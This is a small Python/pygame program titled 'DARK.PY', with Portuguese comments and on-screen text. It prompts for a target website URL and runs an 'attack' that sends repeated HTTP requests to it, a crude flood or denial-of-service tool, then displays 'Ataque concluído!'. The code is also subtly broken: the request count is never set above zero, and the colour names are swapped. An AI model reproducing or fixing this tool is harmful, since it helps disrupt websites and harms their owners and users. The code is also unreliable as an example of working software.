import pygame
import urllib.request
import sys

# Inicializando o Pygame
pygame.init()

fundo = pygame.image.load('imagem1.jpg')  #Fundo da imagem


# Definindo as cores
WHITE = (251, 25, 255)
BLACK = (255, 255, 255)

# Definindo as dimensões da tela
SCREEN_WIDTH, SCREEN_HEIGHT = 480, 480
screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
pygame.display.set_caption("DARK.PY")

# Definindo a fonte
font = pygame.font.Font(None, 32)

def draw_text(text, color, x, y):
    text_surface = font.render(text, True, color)
    screen.blit(text_surface, (x, y))

def attack_website(url, num_requests):
    try:
        for _ in range(num_requests):
            response = urllib.request.urlopen(url)
            print(f"Enviando solicitação para {url} - Status: {response.getcode()}")
    except urllib.error.URLError as e:
        print(f"Erro ao enviar solicitação: {e}")

def main():
    clock = pygame.time.Clock()
    input_active = True
    website_url = ""
    num_requests = 0

    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()

            if event.type == pygame.KEYDOWN:            
                if input_active:
                    if event.key == pygame.K_RETURN:
                        attack_website(website_url, num_requests)
                        input_active = False
                    elif event.key == pygame.K_BACKSPACE:
                        if len(website_url) > 0:
                            website_url = website_url[:-1]
                    elif event.key == pygame.K_TAB:
                        input_active = False
                    else:
                        website_url += event.unicode

        screen.blit(fundo, (0,0))
        draw_text("Digite o URL do site alvo:", BLACK, 120, 200)
        draw_text(website_url, BLACK, 180, 250)

        if not input_active:
            draw_text("Ataque concluído!", BLACK, 140, 300)

        pygame.display.flip()
        clock.tick(30)

if __name__ == "__main__":
    main()
